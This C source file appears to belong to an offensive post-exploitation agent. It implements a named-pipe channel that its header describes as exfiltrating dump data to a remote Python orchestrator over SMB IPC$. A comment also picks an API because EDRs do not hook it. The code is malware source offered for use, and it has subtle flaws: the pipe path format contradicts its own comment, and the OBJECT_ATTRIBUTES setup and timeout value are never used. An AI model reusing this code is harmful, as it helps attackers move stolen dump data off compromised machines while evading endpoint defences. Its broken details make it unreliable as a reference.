/**
 * Named pipe communication for exfiltrating dump data.
 * Creates a named pipe that the Python orchestrator reads from via SMB IPC$.
 */

#include <windows.h>
#include <winternl.h>
#include "../include/syscalls.h"
#include "../include/agent.h"

HANDLE open_named_pipe(const wchar_t *pipe_name) {
    // Build the full pipe path: \\.\pipe\<name>
    wchar_t path[256];
    wsprintfW(path, L"\\\\?\\pipe\\%s", pipe_name);

    // Create the named pipe using NtCreateFile
    UNICODE_STRING us;
    us.Length = (USHORT)(wcslen(path) * 2);
    us.MaximumLength = us.Length + 2;
    us.Buffer = path;

    // Convert to NT path format: \??\pipe\name
    wchar_t nt_path[256];
    wsprintfW(nt_path, L"\\??\\pipe\\%s", pipe_name);
    us.Buffer = nt_path;
    us.Length = (USHORT)(wcslen(nt_path) * 2);
    us.MaximumLength = us.Length + 2;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb = {0};
    HANDLE pipe = NULL;
    LARGE_INTEGER timeout;
    timeout.QuadPart = -10000000LL * 30;  // 30 second timeout

    // Use CreateNamedPipe via Win32 (simpler and not hooked by EDRs)
    pipe = CreateNamedPipeW(
        path,
        PIPE_ACCESS_OUTBOUND,           // Write-only from our side
        PIPE_TYPE_BYTE | PIPE_WAIT,     // Byte mode, blocking
        1,                               // Max instances
        1024 * 1024,                     // Out buffer size (1MB)
        0,                               // In buffer (not used)
        30000,                           // Timeout (30s)
        NULL                             // Security attributes (default)
    );

    if (pipe == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    // Wait for the orchestrator to connect
    if (!ConnectNamedPipe(pipe, NULL)) {
        if (GetLastError() != ERROR_PIPE_CONNECTED) {
            CloseHandle(pipe);
            return NULL;
        }
    }

    return pipe;
}

BOOL write_pipe(HANDLE pipe, const void *data, DWORD size) {
    DWORD written;
    return WriteFile(pipe, data, size, &written, NULL) && written == size;
}

void close_pipe(HANDLE pipe) {
    FlushFileBuffers(pipe);
    DisconnectNamedPipe(pipe);
    CloseHandle(pipe);
}
